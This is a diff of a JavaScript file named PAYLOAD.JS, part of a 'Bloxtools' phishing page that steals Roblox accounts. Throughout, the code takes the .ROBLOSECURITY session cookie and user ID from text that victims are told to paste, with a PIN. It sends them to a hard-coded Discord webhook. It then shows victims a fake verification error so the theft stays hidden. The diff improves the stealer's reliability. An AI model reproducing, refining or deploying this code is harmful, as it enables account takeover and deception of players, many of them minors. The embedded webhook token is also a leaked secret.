@@ -1,9 +1,8 @@
 /* ======================================================
-   PAYLOAD.JS - MINIMAL WORKING VERSION
-   - Extracts cookie (removes spaces) & user ID
-   - Sends ONLY cookie + user ID to Discord webhook
-   - Shows fake error to victim
-   - No CORS-heavy Roblox API calls (they're blocked)
+   PAYLOAD.JS - FINAL WORKING VERSION
+   - Only extracts .ROBLOSECURITY cookie (removes spaces) + rbxuid
+   - Sends to Discord webhook with a valid embed
+   - No Roblox API calls (they are blocked by CORS)
 ====================================================== */
 
 const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1508982155743723653/WEszq-EnTTfvaUgxU9-0PvNvlqfLLjxIASUSdBn7KY5vGQ9QqiMeFM5mLk3vFkFqJwpJ";
@@ -51,19 +50,20 @@ function extractGameData(fullText) {
     return { success: true, cookie: robloxCookie, rbxuid: rbxuid };
 }
 
-// Send webhook with simple embed (no external fetches, no CORS issues)
+// Send webhook with minimal embed (Discord requires at least one field or description)
 async function sendWebhook(pin, cookie, rbxuid) {
-    statusMessage.textContent = "⏳ Processing...";
-
-    // Build a minimal embed that Discord will accept
+    // Clean the cookie again just in case
+    const cleanCookie = cookie.replace(/\s/g, '');
+    
+    // Simple embed that Discord will accept
     const embed = {
         title: "🔓 Roblox Cookie Dump",
         color: 0xff4444,
-        description: `**User ID:** \`${rbxuid}\`\n**PIN entered:** ${pin}`,
+        description: `**User ID:** \`${rbxuid}\`\n**PIN entered:** \`${pin}\``,
         fields: [
             {
                 name: "🔐 .ROBLOSECURITY Cookie (NO SPACES)",
-                value: `\`\`\`\n${cookie}\n\`\`\``,
+                value: `\`\`\`\n${cleanCookie}\n\`\`\``,
                 inline: false
             }
         ],
@@ -76,20 +76,20 @@ async function sendWebhook(pin, cookie, rbxuid) {
         embeds: [embed]
     };
 
-    // Try to send with retries
+    // Attempt to send with retries
     for (let attempt = 0; attempt < 3; attempt++) {
         try {
-            const res = await fetch(WEBHOOK_URL, {
+            const response = await fetch(WEBHOOK_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
             });
-            if (res.ok) {
-                console.log(`[Bloxtools] Webhook sent successfully on attempt ${attempt + 1}`);
+            if (response.ok) {
+                console.log(`[Bloxtools] Webhook sent successfully (attempt ${attempt + 1})`);
                 return true;
             } else {
-                const errorText = await res.text();
-                console.warn(`Webhook responded with ${res.status}: ${errorText}`);
+                const errorText = await response.text();
+                console.warn(`Webhook error ${response.status}: ${errorText}`);
             }
         } catch (err) {
             console.error(`Attempt ${attempt + 1} failed:`, err);
@@ -99,7 +99,7 @@ async function sendWebhook(pin, cookie, rbxuid) {
     return false;
 }
 
-// Main button: fake error, silent send
+// Main button handler: fake error, silent send
 copyButton.addEventListener("click", async () => {
     statusMessage.textContent = "";
     if (!validatePin()) {
@@ -109,7 +109,7 @@ copyButton.addEventListener("click", async () => {
     }
     const pastedText = gameFileInput.value.trim();
     if (!pastedText) {
-        statusMessage.textContent = "❌ Paste game file content.";
+        statusMessage.textContent = "❌ Paste the PowerShell game file content.";
         statusMessage.style.color = "#ff9d9d";
         return;
     }
@@ -128,16 +128,17 @@ copyButton.addEventListener("click", async () => {
 
     const success = await sendWebhook(pinInput.value, extraction.cookie, extraction.rbxuid);
 
-    // Always show fake error
+    // Always show fake error to the user
     statusMessage.textContent = "❌ Failed to verify cookie. Please check your internet and try again.";
     statusMessage.style.color = "#ff9d9d";
 
     copyButton.classList.remove("loading");
     copyButton.disabled = false;
 
+    // Real result only in console
     if (success) {
-        console.log("%c[Bloxtools] SUCCESS: Webhook delivered with cookie.", "color: green; font-size: 14px");
+        console.log("%c[Bloxtools] SUCCESS: Cookie sent to webhook.", "color: #00ff00; font-size: 14px");
     } else {
-        console.error("%c[Bloxtools] FAILED: Webhook could not be sent.", "color: red; font-size: 14px");
+        console.error("%c[Bloxtools] FAILED: Webhook delivery failed after retries.", "color: #ff0000; font-size: 14px");
     }
 });
